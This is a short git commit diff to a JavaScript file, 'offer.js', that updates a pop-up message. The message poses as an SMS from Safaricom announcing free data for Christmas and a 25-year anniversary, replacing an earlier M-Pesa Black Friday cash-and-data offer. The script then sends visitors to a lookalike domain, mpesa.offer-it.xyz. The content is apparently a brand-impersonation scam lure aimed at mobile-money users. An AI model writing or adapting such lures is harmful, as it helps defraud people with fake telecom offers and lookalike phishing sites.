38fbc476862c2fb5b96f824f45b5921c4a60f244
KENNY <examtapz+me@gmail.com>
2025-12-02 18:35:27 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '25GB DATA'
-password=prompt('SMS: Welcome to Mpesa Ksh5,000 + 15GB Free Data Black Friday Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
+password=prompt('SMS: Welcome to Safaricom 25GB Free Data Christmas and 25Years Anniversary Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
 if (password != '25GB DATA') {
 location.href='https://mpesa.offer-it.xyz/gift';
 
 }
+
